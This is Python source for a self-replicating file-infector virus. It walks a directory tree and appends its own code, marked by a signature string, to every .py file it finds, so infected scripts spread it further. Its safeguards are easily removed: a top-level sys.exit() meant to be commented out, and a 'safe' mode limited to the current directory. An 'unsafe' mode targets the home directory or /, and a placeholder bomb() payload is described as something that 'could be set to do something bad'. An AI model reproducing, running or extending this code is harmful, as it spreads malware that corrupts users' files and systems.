signature = 'c64bbc0d9d14404618bfca75c99895a5'

import os
import sys

sys.exit() #comment out this line to run
mode = 'safe' #set to 'unsafe' to scan root or home instead of os.getcwd()
bomb_condition = True 

def is_root() -> bool:
	return os.geteuid() == 0

def write_vir(filename: str) -> None:
	#Check for the signature in the file.
	#If it's there, the file is already infected.
	with open(filename, 'r') as victim_file_read:
		for line in victim_file_read.readlines():
			if signature in line:
				victim_file_read.close()
				return
		victim_file_read.close()

	#Get the code from this script, so that we can write it to the 
	#victim file
	with open(__file__, 'r') as current_file:
		vir_code = current_file.readlines()
		current_file.close()
	
	#If we are propagating from another host, we only need the part
	#after the signature
	for line in vir_code:
		if signature in line:
			sig_index = vir_code.index(line)
			vir_code = vir_code[sig_index + 1:]


	
	#Write the code to the victim files, so that when the victim file
	#is run, it will look for more .py files and infect them
	with open(filename, 'a') as victim_file_write:
		victim_file_write.write('\n' * 5)
		victim_file_write.write('signature = "' + signature + '"\n\n')
		for line in vir_code:
			victim_file_write.write(line)
		victim_file_write.close()

	return

def bomb():
	"""Currently does nothing, but could be set to do something bad"""
	
	print('That could\'ve been bad')



#START HERE
if mode == 'safe':
	root_dir = os.getcwd() + '/'
elif mode == 'unsafe' and is_root():
	root_dir = '/'
elif mode == 'unsafe' and not is_root():
	root_dir = os.getenv('HOME') + '/'
	
#look for .py files to infect
for root, dir, files in os.walk(root_dir):
	for file in files:
		if file.lower().endswith('.py'):
			if not root.endswith('/'): root += '/'
			pyfile = root + file
			write_vir(pyfile)


if bomb_condition:
	bomb()
